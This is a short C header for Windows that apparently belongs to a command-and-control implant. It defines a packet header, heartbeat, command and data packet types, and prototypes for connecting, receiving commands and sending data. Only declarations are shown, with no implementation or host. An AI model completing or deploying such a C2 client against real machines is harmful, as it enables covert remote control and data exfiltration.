// c2_communication.h

#pragma once

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "c2_config.h"

// C2 Packet Structure
#pragma pack(push, 1)
typedef struct {
    unsigned int packet_type;
    unsigned int data_length;
} C2_PACKET_HEADER;
#pragma pack(pop)

// C2 Packet Types
#define C2_PACKET_HEARTBEAT 0x01
#define C2_PACKET_COMMAND   0x02
#define C2_PACKET_DATA      0x03

// C2 Function Prototypes
BOOL C2_Connect();
void C2_Disconnect();
BOOL C2_SendHeartbeat();
BOOL C2_ReceiveCommand(char* buffer, int buffer_size);
BOOL C2_SendData(const char* data, int data_size);
